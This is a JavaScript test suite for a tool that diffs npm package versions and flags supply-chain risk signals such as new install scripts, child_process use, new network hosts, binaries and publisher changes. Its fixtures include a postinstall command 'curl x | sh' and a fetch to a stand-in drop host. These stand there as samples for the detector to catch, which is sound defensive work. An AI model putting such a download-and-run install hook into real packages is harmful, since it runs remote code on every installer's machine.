import { test } from 'node:test';
import assert from 'node:assert/strict';

import { analyse } from '../src/capabilities.mjs';
import { readTarball } from '../src/tar.mjs';
import { compare, Severity, sameRepository } from '../src/compare.mjs';
import { resolveVersions, releaseFacts, maintainers } from '../src/registry.mjs';
import { makePackage, facts } from './helpers.mjs';

const version = (manifest, files = {}) => analyse(readTarball(makePackage(manifest, files)));

const base = { name: 'x', version: '1.0.0' };
const plain = () => version(base, { 'index.js': 'export const a = 1;\n' });

const kinds = (result) => result.findings.map((f) => f.kind);
const find = (result, kind) => result.findings.find((f) => f.kind === kind);

/* ------------------------------------------------------------ install scripts */

test('an install script appearing is the loudest thing this reports', () => {
  const after = version({ ...base, scripts: { postinstall: 'curl x | sh' } }, { 'index.js': 'x' });
  const result = compare(plain(), after);

  const found = find(result, 'install-script-added');

  assert.equal(found.severity, Severity.Review);
  assert.equal(found.command, 'curl x | sh');
  assert.match(found.summary, /runs on every machine that installs this/);
});

test('an install script changing is reported with both commands', () => {
  const before = version({ ...base, scripts: { postinstall: 'node build.js' } }, { 'index.js': 'x' });
  const after = version({ ...base, scripts: { postinstall: 'node build.js && curl x' } }, { 'index.js': 'x' });

  const found = find(compare(before, after), 'install-script-changed');

  assert.equal(found.severity, Severity.Review);
  assert.match(found.after, /curl/);
});

test('an install script being removed is worth knowing but is not alarming', () => {
  const before = version({ ...base, scripts: { postinstall: 'node build.js' } }, { 'index.js': 'x' });
  const found = find(compare(before, plain()), 'install-script-removed');

  assert.equal(found.severity, Severity.Notice);
});

test('an unchanged install script produces no finding at all', () => {
  const withScript = () => version({ ...base, scripts: { postinstall: 'node build.js' } }, { 'index.js': 'x' });

  assert.ok(!kinds(compare(withScript(), withScript())).some((k) => k.startsWith('install-script')));
});

/* ----------------------------------------------------------------- capability */

test('a capability the previous version did not have is a review finding', () => {
  const after = version(base, { 'index.js': "const cp = require('child_process');" });
  const found = find(compare(plain(), after), 'capability-gained');

  assert.equal(found.severity, Severity.Review);
  assert.match(found.summary, /runs other programs/);
  assert.equal(found.capability, 'process.spawn');
});

test('a capability that was already there is not a finding', () => {
  const withSpawn = () => version(base, { 'index.js': "require('child_process')" });

  assert.ok(!kinds(compare(withSpawn(), withSpawn())).includes('capability-gained'));
});

test('a capability disappearing is reported gently', () => {
  const before = version(base, { 'index.js': "require('child_process')" });
  const found = find(compare(before, plain()), 'capability-lost');

  assert.equal(found.severity, Severity.Notice);
});

/* ---------------------------------------------------------------------- hosts */

test('a new host in code is a review finding', () => {
  const after = version(base, { 'index.js': "fetch('https://drop.example.org/x')" });
  const found = find(compare(plain(), after), 'host-added');

  assert.equal(found.severity, Severity.Review);
  assert.equal(found.host, 'drop.example.org');
});

test('a host only in the readme is not a finding, whatever it is', () => {
  // The bug the first live run found, kept honest by a test.
  const after = version(base, { 'index.js': 'export const a = 1;\n', 'README.md': 'https://strapi.io https://codecov.io' });

  assert.ok(!kinds(compare(plain(), after)).includes('host-added'));
});

/* ---------------------------------------------------------------------- shape */

test('a new binary file is a review finding, because nothing here can read it', () => {
  const after = analyse([
    ...readTarball(makePackage(base, { 'index.js': 'x' })),
    { name: 'native.node', size: 4, type: 'file', content: Buffer.from([0, 1, 2, 3]) },
  ]);

  const found = find(compare(plain(), after), 'binary-added');

  assert.equal(found.severity, Severity.Review);
  assert.deepEqual(found.files, ['native.node']);
});

test('a file becoming one enormous line is reported', () => {
  const after = version(base, { 'index.js': `const a=${'"x",'.repeat(700)}1;` });
  const found = find(compare(plain(), after), 'minified-added');

  assert.equal(found.severity, Severity.Notice);
});

test('a package doubling in size is reported without being called wrong', () => {
  const after = version(base, { 'index.js': 'a'.repeat(20000) });
  const found = find(compare(plain(), after), 'size-jump');

  assert.equal(found.severity, Severity.Notice);
});

/* ------------------------------------------------------------------- manifest */

test('a new dependency is a notice rather than an alarm', () => {
  const after = version({ ...base, dependencies: { 'left-pad': '^1.0.0' } }, { 'index.js': 'x' });
  const found = find(compare(plain(), after), 'dependency-added');

  assert.equal(found.severity, Severity.Notice);
  assert.deepEqual(found.dependencies, ['left-pad']);
});

test('a package that starts putting something on the PATH is a review finding', () => {
  const after = version({ ...base, bin: { tool: './cli.js' } }, { 'index.js': 'x' });
  const found = find(compare(plain(), after), 'bin-added');

  assert.equal(found.severity, Severity.Review);
});

test('the same repository spelled two ways is not a move', () => {
  // The second bug a live run found. Raising the most alarming finding this
  // tool has over a .git suffix is how a reader learns to ignore it.
  assert.equal(sameRepository('https://github.com/a/b', 'git+https://github.com/a/b.git'), true);
  assert.equal(sameRepository('git@github.com:a/b.git', 'https://github.com/a/b'), true);
  assert.equal(sameRepository('https://github.com/a/b/', 'https://github.com/a/b'), true);
  assert.equal(sameRepository('ssh://git@github.com/a/b.git', 'https://github.com/a/b'), true);
});

test('a repository genuinely moving is still reported', () => {
  assert.equal(sameRepository('https://github.com/a/b', 'https://github.com/somebody-else/b'), false);

  const before = version({ ...base, repository: 'https://github.com/a/b' }, { 'index.js': 'x' });
  const after = version({ ...base, repository: 'https://github.com/somebody-else/b' }, { 'index.js': 'x' });

  assert.equal(find(compare(before, after), 'repository-changed').severity, Severity.Review);
});

/* -------------------------------------------------------------------- release */

test('a different publisher is the fact code review will never give you', () => {
  const result = compare(plain(), plain(), {
    before: facts({ publisher: 'original' }),
    after: facts({ publisher: 'newcomer' }),
    maintainers: ['original', 'newcomer'],
  });

  const found = find(result, 'publisher-changed');

  assert.equal(found.severity, Severity.Review);
  assert.match(found.summary, /newcomer/);
});

test('losing provenance is a review finding, gaining it is background', () => {
  const lost = compare(plain(), plain(), {
    before: facts({ hasProvenance: true }), after: facts({ hasProvenance: false }),
  });
  const gained = compare(plain(), plain(), {
    before: facts({ hasProvenance: false }), after: facts({ hasProvenance: true }),
  });

  assert.equal(find(lost, 'provenance-lost').severity, Severity.Review);
  assert.equal(find(gained, 'provenance-gained').severity, Severity.Context);
});

test('a deprecated version says what the registry says', () => {
  const result = compare(plain(), plain(), {
    before: facts(), after: facts({ deprecated: 'use something else' }),
  });

  assert.match(find(result, 'deprecated').summary, /use something else/);
});

/* --------------------------------------------------------------------- totals */

test('an identical pair of versions is quiet', () => {
  const result = compare(plain(), plain(), { before: facts(), after: facts() });

  assert.equal(result.counts.review, 0);
  assert.equal(result.quiet, true);
});

test('findings come back worst first, because that is the reading order', () => {
  const after = version(
    { ...base, scripts: { postinstall: 'x' }, dependencies: { a: '1' } },
    { 'index.js': "require('child_process')" },
  );

  const result = compare(plain(), after, { before: facts(), after: facts() });
  const rank = { [Severity.Review]: 0, [Severity.Notice]: 1, [Severity.Context]: 2 };

  // Non-decreasing severity from first to last, which is the only property
  // that actually matters and the one a reader relies on when they stop
  // halfway down.
  for (let i = 1; i < result.findings.length; i++) {
    assert.ok(
      rank[result.findings[i].severity] >= rank[result.findings[i - 1].severity],
      `${result.findings[i - 1].kind} came before ${result.findings[i].kind}`,
    );
  }

  assert.equal(result.findings[0].severity, Severity.Review);
  assert.ok(result.counts.review >= 2);
  assert.ok(result.counts.context >= 1, 'the timing line is context and must sort last');
});

/* --------------------------------------------------------- version resolution */

const packument = {
  name: 'x',
  'dist-tags': { latest: '2.0.0' },
  versions: { '1.0.0': {}, '1.5.0': {}, '2.0.0': {} },
  time: {
    '1.0.0': '2026-01-01T00:00:00Z',
    '1.5.0': '2026-02-01T00:00:00Z',
    '2.0.0': '2026-03-01T00:00:00Z',
  },
  maintainers: [{ name: 'a' }, { name: 'b' }],
};

test('the version before is resolved by publish time, not by semver order', () => {
  // A patch for an older line published in between is what the user actually
  // upgraded from, whatever its number says.
  assert.deepEqual(resolveVersions(packument, '2.0.0'), { from: '1.5.0', to: '2.0.0' });
});

test('latest resolves through dist-tags', () => {
  assert.deepEqual(resolveVersions(packument, 'latest'), { from: '1.5.0', to: '2.0.0' });
});

test('an explicit from is honoured', () => {
  assert.deepEqual(resolveVersions(packument, '2.0.0', '1.0.0'), { from: '1.0.0', to: '2.0.0' });
});

test('a version that does not exist says so rather than guessing a near one', () => {
  assert.throws(() => resolveVersions(packument, '9.9.9'), /no version 9.9.9/);
  assert.throws(() => resolveVersions(packument, '2.0.0', '9.9.9'), /no version 9.9.9/);
});

test('the first ever version has nothing to compare against', () => {
  assert.throws(() => resolveVersions(packument, '1.0.0'), /first published version/);
});

test('release facts read what the registry knows beyond the manifest', () => {
  const doc = {
    versions: { '1.0.0': { _npmUser: { name: 'someone' }, dist: { unpackedSize: 42, attestations: {} } } },
    time: { '1.0.0': '2026-01-01T00:00:00Z' },
  };

  const read = releaseFacts(doc, '1.0.0');

  assert.equal(read.publisher, 'someone');
  assert.equal(read.hasProvenance, true);
  assert.equal(read.unpackedSize, 42);
});

test('maintainers come back sorted and named', () => {
  assert.deepEqual(maintainers(packument), ['a', 'b']);
  assert.deepEqual(maintainers({}), []);
});
